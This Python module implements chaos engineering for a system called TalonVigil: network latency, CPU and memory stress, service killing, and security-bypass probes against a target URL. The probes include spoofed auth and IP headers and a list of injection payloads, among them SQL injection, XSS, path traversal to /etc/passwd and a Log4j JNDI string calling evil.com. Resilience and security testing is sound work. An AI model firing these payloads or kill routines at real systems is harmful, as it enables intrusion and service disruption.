"""
Chaos Engineering for TalonVigil
Implements chaos testing to validate system resilience and security controls
"""

import asyncio
import logging
import random
import time
from abc import ABC, abstractmethod
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
import json
import threading
import subprocess
import psutil
import socket
import requests
from contextlib import contextmanager

logger = logging.getLogger(__name__)

class ChaosType(Enum):
    """Types of chaos experiments"""
    NETWORK_LATENCY = "network_latency"
    NETWORK_LOSS = "network_loss"
    NETWORK_CORRUPTION = "network_corruption"
    CPU_STRESS = "cpu_stress"
    MEMORY_STRESS = "memory_stress"
    DISK_STRESS = "disk_stress"
    SERVICE_KILL = "service_kill"
    DATABASE_FAILURE = "database_failure"
    API_FAILURE = "api_failure"
    SECURITY_BYPASS = "security_bypass"
    AUTH_FAILURE = "auth_failure"
    RATE_LIMIT_BREACH = "rate_limit_breach"

class ExperimentStatus(Enum):
    """Chaos experiment status"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    ABORTED = "aborted"

@dataclass
class ChaosExperiment:
    """Chaos experiment definition"""
    id: str
    name: str
    description: str
    chaos_type: ChaosType
    parameters: Dict[str, Any]
    duration: int  # seconds
    target: str  # service, endpoint, or resource
    status: ExperimentStatus = ExperimentStatus.PENDING
    created_at: datetime = field(default_factory=datetime.utcnow)
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    results: Dict[str, Any] = field(default_factory=dict)
    metrics: Dict[str, Any] = field(default_factory=dict)
    rollback_actions: List[str] = field(default_factory=list)

@dataclass
class ChaosMetrics:
    """Metrics collected during chaos experiments"""
    response_times: List[float] = field(default_factory=list)
    error_rates: List[float] = field(default_factory=list)
    throughput: List[float] = field(default_factory=list)
    cpu_usage: List[float] = field(default_factory=list)
    memory_usage: List[float] = field(default_factory=list)
    security_alerts: List[Dict[str, Any]] = field(default_factory=list)
    failed_authentications: int = 0
    blocked_requests: int = 0

class ChaosAction(ABC):
    """Abstract base class for chaos actions"""
    
    def __init__(self, parameters: Dict[str, Any]):
        self.parameters = parameters
        self.active = False
        
    @abstractmethod
    async def execute(self) -> bool:
        """Execute the chaos action"""
        pass
    
    @abstractmethod
    async def rollback(self) -> bool:
        """Rollback the chaos action"""
        pass
    
    @abstractmethod
    def get_metrics(self) -> Dict[str, Any]:
        """Get metrics from the chaos action"""
        pass

class NetworkLatencyAction(ChaosAction):
    """Inject network latency using tc (traffic control)"""
    
    async def execute(self) -> bool:
        """Add network latency"""
        try:
            interface = self.parameters.get('interface', 'eth0')
            delay = self.parameters.get('delay', '100ms')
            variation = self.parameters.get('variation', '10ms')
            
            # Add traffic control rule
            cmd = f"tc qdisc add dev {interface} root netem delay {delay} {variation}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.active = True
                logger.info(f"Added network latency: {delay} ± {variation} on {interface}")
                return True
            else:
                logger.error(f"Failed to add network latency: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Error executing network latency action: {e}")
            return False
    
    async def rollback(self) -> bool:
        """Remove network latency"""
        try:
            interface = self.parameters.get('interface', 'eth0')
            
            # Remove traffic control rule
            cmd = f"tc qdisc del dev {interface} root"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.active = False
                logger.info(f"Removed network latency on {interface}")
                return True
            else:
                logger.warning(f"Failed to remove network latency (may not exist): {result.stderr}")
                return True  # Consider success if rule doesn't exist
                
        except Exception as e:
            logger.error(f"Error rolling back network latency action: {e}")
            return False
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get network metrics"""
        return {
            "active": self.active,
            "interface": self.parameters.get('interface', 'eth0'),
            "delay": self.parameters.get('delay', '100ms')
        }

class CPUStressAction(ChaosAction):
    """Generate CPU stress"""
    
    def __init__(self, parameters: Dict[str, Any]):
        super().__init__(parameters)
        self.stress_processes = []
    
    async def execute(self) -> bool:
        """Start CPU stress"""
        try:
            cpu_percent = self.parameters.get('cpu_percent', 80)
            duration = self.parameters.get('duration', 60)
            cores = self.parameters.get('cores', psutil.cpu_count())
            
            # Start stress processes
            for i in range(cores):
                process = threading.Thread(target=self._cpu_stress_worker, args=(cpu_percent, duration))
                process.daemon = True
                process.start()
                self.stress_processes.append(process)
            
            self.active = True
            logger.info(f"Started CPU stress: {cpu_percent}% on {cores} cores")
            return True
            
        except Exception as e:
            logger.error(f"Error executing CPU stress action: {e}")
            return False
    
    async def rollback(self) -> bool:
        """Stop CPU stress"""
        try:
            self.active = False
            # Processes will stop automatically when active becomes False
            logger.info("Stopped CPU stress")
            return True
            
        except Exception as e:
            logger.error(f"Error rolling back CPU stress action: {e}")
            return False
    
    def _cpu_stress_worker(self, cpu_percent: int, duration: int):
        """Worker thread for CPU stress"""
        start_time = time.time()
        target_load = cpu_percent / 100.0
        
        while self.active and (time.time() - start_time) < duration:
            # Create CPU load
            start = time.time()
            while (time.time() - start) < target_load:
                pass
            
            # Sleep to achieve target CPU percentage
            sleep_time = (1.0 - target_load)
            if sleep_time > 0:
                time.sleep(sleep_time)
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get CPU metrics"""
        return {
            "active": self.active,
            "cpu_percent": psutil.cpu_percent(interval=1),
            "load_average": psutil.getloadavg() if hasattr(psutil, 'getloadavg') else None
        }

class MemoryStressAction(ChaosAction):
    """Generate memory stress"""
    
    def __init__(self, parameters: Dict[str, Any]):
        super().__init__(parameters)
        self.memory_blocks = []
    
    async def execute(self) -> bool:
        """Start memory stress"""
        try:
            memory_mb = self.parameters.get('memory_mb', 1024)
            block_size_mb = self.parameters.get('block_size_mb', 100)
            
            # Allocate memory in blocks
            blocks_needed = memory_mb // block_size_mb
            for i in range(blocks_needed):
                # Allocate and fill memory block
                block = bytearray(block_size_mb * 1024 * 1024)
                # Fill with random data to prevent optimization
                for j in range(0, len(block), 4096):
                    block[j] = random.randint(0, 255)
                self.memory_blocks.append(block)
            
            self.active = True
            logger.info(f"Allocated {memory_mb} MB of memory")
            return True
            
        except Exception as e:
            logger.error(f"Error executing memory stress action: {e}")
            return False
    
    async def rollback(self) -> bool:
        """Release memory"""
        try:
            self.memory_blocks.clear()
            self.active = False
            logger.info("Released memory stress")
            return True
            
        except Exception as e:
            logger.error(f"Error rolling back memory stress action: {e}")
            return False
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get memory metrics"""
        memory = psutil.virtual_memory()
        return {
            "active": self.active,
            "memory_percent": memory.percent,
            "memory_available_mb": memory.available // (1024 * 1024),
            "memory_used_mb": memory.used // (1024 * 1024)
        }

class ServiceKillAction(ChaosAction):
    """Kill and restart services"""
    
    async def execute(self) -> bool:
        """Kill target service"""
        try:
            service_name = self.parameters.get('service_name')
            if not service_name:
                return False
            
            # Find and kill service processes
            killed_pids = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if service_name in proc.info['name'] or any(service_name in arg for arg in proc.info['cmdline']):
                        proc.kill()
                        killed_pids.append(proc.info['pid'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            if killed_pids:
                self.active = True
                self.parameters['killed_pids'] = killed_pids
                logger.info(f"Killed {service_name} processes: {killed_pids}")
                return True
            else:
                logger.warning(f"No processes found for service: {service_name}")
                return False
                
        except Exception as e:
            logger.error(f"Error executing service kill action: {e}")
            return False
    
    async def rollback(self) -> bool:
        """Restart service (if configured)"""
        try:
            restart_command = self.parameters.get('restart_command')
            if restart_command:
                result = subprocess.run(restart_command, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    logger.info(f"Restarted service with command: {restart_command}")
                else:
                    logger.error(f"Failed to restart service: {result.stderr}")
            
            self.active = False
            return True
            
        except Exception as e:
            logger.error(f"Error rolling back service kill action: {e}")
            return False
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get service metrics"""
        service_name = self.parameters.get('service_name')
        running_processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'status']):
            try:
                if service_name in proc.info['name']:
                    running_processes.append({
                        'pid': proc.info['pid'],
                        'status': proc.info['status']
                    })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        return {
            "active": self.active,
            "service_name": service_name,
            "running_processes": running_processes
        }

class SecurityBypassAction(ChaosAction):
    """Simulate security control bypasses"""
    
    async def execute(self) -> bool:
        """Execute security bypass simulation"""
        try:
            bypass_type = self.parameters.get('bypass_type', 'auth_header')
            target_url = self.parameters.get('target_url')
            
            if bypass_type == 'auth_header':
                # Try requests without proper authentication
                await self._test_auth_bypass(target_url)
            elif bypass_type == 'rate_limit':
                # Try to exceed rate limits
                await self._test_rate_limit_bypass(target_url)
            elif bypass_type == 'input_validation':
                # Try various injection attacks
                await self._test_input_validation_bypass(target_url)
            
            self.active = True
            return True
            
        except Exception as e:
            logger.error(f"Error executing security bypass action: {e}")
            return False
    
    async def rollback(self) -> bool:
        """Stop security bypass testing"""
        self.active = False
        return True
    
    async def _test_auth_bypass(self, target_url: str):
        """Test authentication bypass"""
        bypass_attempts = [
            {},  # No headers
            {"Authorization": ""},  # Empty auth
            {"Authorization": "Bearer invalid"},  # Invalid token
            {"X-Admin": "true"},  # Admin header injection
            {"X-Forwarded-For": "127.0.0.1"},  # IP spoofing attempt
        ]
        
        results = []
        for headers in bypass_attempts:
            try:
                response = requests.get(target_url, headers=headers, timeout=5)
                results.append({
                    "headers": headers,
                    "status_code": response.status_code,
                    "successful_bypass": response.status_code == 200
                })
            except Exception as e:
                results.append({
                    "headers": headers,
                    "error": str(e),
                    "successful_bypass": False
                })
        
        self.parameters['bypass_results'] = results
        logger.info(f"Completed auth bypass tests: {len(results)} attempts")
    
    async def _test_rate_limit_bypass(self, target_url: str):
        """Test rate limit bypass"""
        bypass_techniques = [
            {},  # Normal requests
            {"X-Forwarded-For": f"192.168.1.{random.randint(1, 254)}"},  # IP rotation
            {"X-Real-IP": f"10.0.0.{random.randint(1, 254)}"},  # IP spoofing
            {"User-Agent": f"TestAgent-{random.randint(1000, 9999)}"},  # UA rotation
        ]
        
        results = []
        for i in range(100):  # Send many requests
            headers = random.choice(bypass_techniques)
            try:
                start_time = time.time()
                response = requests.get(target_url, headers=headers, timeout=2)
                response_time = time.time() - start_time
                
                results.append({
                    "request_id": i,
                    "status_code": response.status_code,
                    "response_time": response_time,
                    "rate_limited": response.status_code == 429
                })
            except Exception as e:
                results.append({
                    "request_id": i,
                    "error": str(e),
                    "rate_limited": True
                })
        
        self.parameters['rate_limit_results'] = results
        successful_requests = sum(1 for r in results if r.get('status_code') == 200)
        logger.info(f"Rate limit test: {successful_requests}/{len(results)} successful requests")
    
    async def _test_input_validation_bypass(self, target_url: str):
        """Test input validation bypass"""
        payloads = [
            "' OR '1'='1",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}",  # Log4j
            "{{7*7}}",  # SSTI
            "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoded XSS
        ]
        
        results = []
        for payload in payloads:
            try:
                # Test in URL parameters
                test_url = f"{target_url}?test={payload}"
                response = requests.get(test_url, timeout=5)
                
                results.append({
                    "payload": payload,
                    "method": "GET",
                    "status_code": response.status_code,
                    "reflected": payload in response.text,
                    "error_detected": "error" in response.text.lower()
                })
                
                # Test in POST data
                response = requests.post(target_url, data={"test": payload}, timeout=5)
                results.append({
                    "payload": payload,
                    "method": "POST",
                    "status_code": response.status_code,
                    "reflected": payload in response.text,
                    "error_detected": "error" in response.text.lower()
                })
                
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)
                })
        
        self.parameters['validation_results'] = results
        logger.info(f"Input validation test: {len(results)} payload tests completed")
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get security testing metrics"""
        return {
            "active": self.active,
            "bypass_type": self.parameters.get('bypass_type'),
            "results": self.parameters.get('bypass_results', [])
        }

class ChaosEngineering:
    """
    Main chaos engineering orchestrator
    Manages and executes chaos experiments
    """
    
    def __init__(self):
        self.experiments: Dict[str, ChaosExperiment] = {}
        self.active_experiments: Dict[str, ChaosAction] = {}
        self.metrics_collectors: List[Callable] = []
        self.safety_checks: List[Callable] = []
        self.experiment_lock = threading.Lock()
        
        # Register default safety checks
        self._register_default_safety_checks()
    
    def register_metrics_collector(self, collector: Callable):
        """Register a metrics collector function"""
        self.metrics_collectors.append(collector)
    
    def register_safety_check(self, check: Callable):
        """Register a safety check function"""
        self.safety_checks.append(check)
    
    async def create_experiment(self, experiment: ChaosExperiment) -> bool:
        """Create and validate a chaos experiment"""
        try:
            # Validate experiment
            if not self._validate_experiment(experiment):
                logger.error(f"Experiment validation failed: {experiment.id}")
                return False
            
            # Run safety checks
            if not await self._run_safety_checks(experiment):
                logger.error(f"Safety checks failed for experiment: {experiment.id}")
                return False
            
            with self.experiment_lock:
                self.experiments[experiment.id] = experiment
            
            logger.info(f"Created chaos experiment: {experiment.id}")
            return True
            
        except Exception as e:
            logger.error(f"Error creating experiment: {e}")
            return False
    
    async def start_experiment(self, experiment_id: str) -> bool:
        """Start a chaos experiment"""
        try:
            experiment = self.experiments.get(experiment_id)
            if not experiment:
                logger.error(f"Experiment not found: {experiment_id}")
                return False
            
            if experiment.status != ExperimentStatus.PENDING:
                logger.error(f"Experiment not in pending state: {experiment_id}")
                return False
            
            # Create chaos action
            action = self._create_chaos_action(experiment)
            if not action:
                logger.error(f"Failed to create chaos action for: {experiment_id}")
                return False
            
            # Start experiment
            experiment.status = ExperimentStatus.RUNNING
            experiment.started_at = datetime.utcnow()
            
            # Execute chaos action
            success = await action.execute()
            if not success:
                experiment.status = ExperimentStatus.FAILED
                logger.error(f"Failed to execute chaos action for: {experiment_id}")
                return False
            
            with self.experiment_lock:
                self.active_experiments[experiment_id] = action
            
            # Schedule experiment completion
            asyncio.create_task(self._monitor_experiment(experiment_id))
            
            logger.info(f"Started chaos experiment: {experiment_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error starting experiment: {e}")
            return False
    
    async def stop_experiment(self, experiment_id: str, force: bool = False) -> bool:
        """Stop a running chaos experiment"""
        try:
            experiment = self.experiments.get(experiment_id)
            action = self.active_experiments.get(experiment_id)
            
            if not experiment or not action:
                logger.error(f"Active experiment not found: {experiment_id}")
                return False
            
            # Rollback chaos action
            success = await action.rollback()
            if not success and not force:
                logger.error(f"Failed to rollback experiment: {experiment_id}")
                return False
            
            # Update experiment status
            experiment.status = ExperimentStatus.ABORTED if not success else ExperimentStatus.COMPLETED
            experiment.completed_at = datetime.utcnow()
            
            # Collect final metrics
            experiment.metrics = self._collect_metrics(action)
            
            with self.experiment_lock:
                self.active_experiments.pop(experiment_id, None)
            
            logger.info(f"Stopped chaos experiment: {experiment_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error stopping experiment: {e}")
            return False
    
    async def get_experiment_status(self, experiment_id: str) -> Optional[ChaosExperiment]:
        """Get experiment status and metrics"""
        experiment = self.experiments.get(experiment_id)
        if not experiment:
            return None
        
        # Update metrics if experiment is running
        action = self.active_experiments.get(experiment_id)
        if action:
            experiment.metrics = self._collect_metrics(action)
        
        return experiment
    
    def list_experiments(self, status: ExperimentStatus = None) -> List[ChaosExperiment]:
        """List experiments with optional status filter"""
        experiments = list(self.experiments.values())
        if status:
            experiments = [exp for exp in experiments if exp.status == status]
        return experiments
    
    def _validate_experiment(self, experiment: ChaosExperiment) -> bool:
        """Validate experiment configuration"""
        # Check required fields
        if not experiment.id or not experiment.name or not experiment.chaos_type:
            return False
        
        # Check duration limits
        if experiment.duration <= 0 or experiment.duration > 3600:  # Max 1 hour
            return False
        
        # Validate parameters based on chaos type
        required_params = self._get_required_parameters(experiment.chaos_type)
        for param in required_params:
            if param not in experiment.parameters:
                logger.error(f"Missing required parameter: {param}")
                return False
        
        return True
    
    def _get_required_parameters(self, chaos_type: ChaosType) -> List[str]:
        """Get required parameters for chaos type"""
        param_map = {
            ChaosType.NETWORK_LATENCY: ['interface'],
            ChaosType.CPU_STRESS: ['cpu_percent'],
            ChaosType.MEMORY_STRESS: ['memory_mb'],
            ChaosType.SERVICE_KILL: ['service_name'],
            ChaosType.SECURITY_BYPASS: ['target_url', 'bypass_type']
        }
        return param_map.get(chaos_type, [])
    
    async def _run_safety_checks(self, experiment: ChaosExperiment) -> bool:
        """Run safety checks before starting experiment"""
        for check in self.safety_checks:
            try:
                if not await check(experiment):
                    logger.warning(f"Safety check failed: {check.__name__}")
                    return False
            except Exception as e:
                logger.error(f"Safety check error: {e}")
                return False
        return True
    
    def _create_chaos_action(self, experiment: ChaosExperiment) -> Optional[ChaosAction]:
        """Create chaos action based on experiment type"""
        action_map = {
            ChaosType.NETWORK_LATENCY: NetworkLatencyAction,
            ChaosType.CPU_STRESS: CPUStressAction,
            ChaosType.MEMORY_STRESS: MemoryStressAction,
            ChaosType.SERVICE_KILL: ServiceKillAction,
            ChaosType.SECURITY_BYPASS: SecurityBypassAction
        }
        
        action_class = action_map.get(experiment.chaos_type)
        if not action_class:
            logger.error(f"Unsupported chaos type: {experiment.chaos_type}")
            return None
        
        return action_class(experiment.parameters)
    
    def _collect_metrics(self, action: ChaosAction) -> Dict[str, Any]:
        """Collect metrics from chaos action and collectors"""
        metrics = action.get_metrics()
        
        # Add system metrics
        metrics.update({
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": psutil.disk_usage('/').percent,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        # Run additional metrics collectors
        for collector in self.metrics_collectors:
            try:
                additional_metrics = collector()
                metrics.update(additional_metrics)
            except Exception as e:
                logger.error(f"Metrics collector error: {e}")
        
        return metrics
    
    async def _monitor_experiment(self, experiment_id: str):
        """Monitor experiment and stop when duration expires"""
        experiment = self.experiments.get(experiment_id)
        if not experiment:
            return
        
        # Wait for experiment duration
        await asyncio.sleep(experiment.duration)
        
        # Stop experiment if still running
        if experiment_id in self.active_experiments:
            await self.stop_experiment(experiment_id)
    
    def _register_default_safety_checks(self):
        """Register default safety checks"""
        
        async def check_system_resources(experiment: ChaosExperiment) -> bool:
            """Ensure system has enough resources"""
            if experiment.chaos_type == ChaosType.CPU_STRESS:
                if psutil.cpu_percent(interval=1) > 80:
                    logger.warning("System CPU already high, skipping CPU stress test")
                    return False
            
            if experiment.chaos_type == ChaosType.MEMORY_STRESS:
                memory = psutil.virtual_memory()
                if memory.percent > 80:
                    logger.warning("System memory already high, skipping memory stress test")
                    return False
            
            return True
        
        async def check_production_environment(experiment: ChaosExperiment) -> bool:
            """Prevent dangerous experiments in production"""
            # This should be configured based on environment detection
            import os
            env = os.getenv('ENVIRONMENT', 'development')
            
            dangerous_types = [ChaosType.SERVICE_KILL, ChaosType.DATABASE_FAILURE]
            
            if env == 'production' and experiment.chaos_type in dangerous_types:
                logger.warning("Dangerous chaos type blocked in production environment")
                return False
            
            return True
        
        self.register_safety_check(check_system_resources)
        self.register_safety_check(check_production_environment)


# Utility functions for common chaos engineering scenarios
async def run_resilience_test_suite(chaos_engine: ChaosEngineering, target_service: str) -> Dict[str, bool]:
    """Run a comprehensive resilience test suite"""
    results = {}
    
    # Network resilience tests
    network_experiments = [
        ChaosExperiment(
            id="network_latency_test",
            name="Network Latency Test",
            description="Test service behavior under network latency",
            chaos_type=ChaosType.NETWORK_LATENCY,
            parameters={"interface": "eth0", "delay": "200ms", "variation": "50ms"},
            duration=60,
            target=target_service
        ),
        ChaosExperiment(
            id="network_loss_test",
            name="Network Packet Loss Test",
            description="Test service behavior under packet loss",
            chaos_type=ChaosType.NETWORK_LOSS,
            parameters={"interface": "eth0", "loss": "5%"},
            duration=60,
            target=target_service
        )
    ]
    
    # Resource resilience tests
    resource_experiments = [
        ChaosExperiment(
            id="cpu_stress_test",
            name="CPU Stress Test",
            description="Test service behavior under CPU stress",
            chaos_type=ChaosType.CPU_STRESS,
            parameters={"cpu_percent": 80, "cores": 2},
            duration=60,
            target=target_service
        ),
        ChaosExperiment(
            id="memory_stress_test",
            name="Memory Stress Test",
            description="Test service behavior under memory pressure",
            chaos_type=ChaosType.MEMORY_STRESS,
            parameters={"memory_mb": 1024},
            duration=60,
            target=target_service
        )
    ]
    
    # Security resilience tests
    security_experiments = [
        ChaosExperiment(
            id="auth_bypass_test",
            name="Authentication Bypass Test",
            description="Test authentication controls",
            chaos_type=ChaosType.SECURITY_BYPASS,
            parameters={"target_url": f"http://{target_service}/api/protected", "bypass_type": "auth_header"},
            duration=30,
            target=target_service
        ),
        ChaosExperiment(
            id="rate_limit_test",
            name="Rate Limit Bypass Test",
            description="Test rate limiting controls",
            chaos_type=ChaosType.SECURITY_BYPASS,
            parameters={"target_url": f"http://{target_service}/api/test", "bypass_type": "rate_limit"},
            duration=30,
            target=target_service
        )
    ]
    
    all_experiments = network_experiments + resource_experiments + security_experiments
    
    # Run experiments sequentially
    for experiment in all_experiments:
        try:
            # Create and start experiment
            if await chaos_engine.create_experiment(experiment):
                if await chaos_engine.start_experiment(experiment.id):
                    # Wait for completion
                    while True:
                        status = await chaos_engine.get_experiment_status(experiment.id)
                        if status and status.status in [ExperimentStatus.COMPLETED, ExperimentStatus.FAILED, ExperimentStatus.ABORTED]:
                            results[experiment.id] = status.status == ExperimentStatus.COMPLETED
                            break
                        await asyncio.sleep(5)
                else:
                    results[experiment.id] = False
            else:
                results[experiment.id] = False
        except Exception as e:
            logger.error(f"Error running experiment {experiment.id}: {e}")
            results[experiment.id] = False
    
    return results

def create_chaos_schedule(chaos_engine: ChaosEngineering) -> None:
    """Create a schedule for regular chaos experiments"""
    import schedule
    
    def run_daily_chaos():
        """Run daily chaos experiments"""
        async def daily_experiment():
            experiment = ChaosExperiment(
                id=f"daily_chaos_{datetime.now().strftime('%Y%m%d')}",
                name="Daily Chaos Test",
                description="Daily resilience test",
                chaos_type=ChaosType.CPU_STRESS,
                parameters={"cpu_percent": 50, "cores": 1},
                duration=120,
                target="application"
            )
            
            if await chaos_engine.create_experiment(experiment):
                await chaos_engine.start_experiment(experiment.id)
        
        asyncio.create_task(daily_experiment())
    
    def run_weekly_security_chaos():
        """Run weekly security chaos tests"""
        async def weekly_security():
            experiment = ChaosExperiment(
                id=f"weekly_security_{datetime.now().strftime('%Y%m%d')}",
                name="Weekly Security Chaos Test",
                description="Weekly security resilience test",
                chaos_type=ChaosType.SECURITY_BYPASS,
                parameters={"target_url": "http://localhost:5000/api/test", "bypass_type": "auth_header"},
                duration=300,
                target="application"
            )
            
            if await chaos_engine.create_experiment(experiment):
                await chaos_engine.start_experiment(experiment.id)
        
        asyncio.create_task(weekly_security())
    
    # Schedule experiments
    schedule.every().day.at("02:00").do(run_daily_chaos)
    schedule.every().sunday.at("03:00").do(run_weekly_security_chaos)
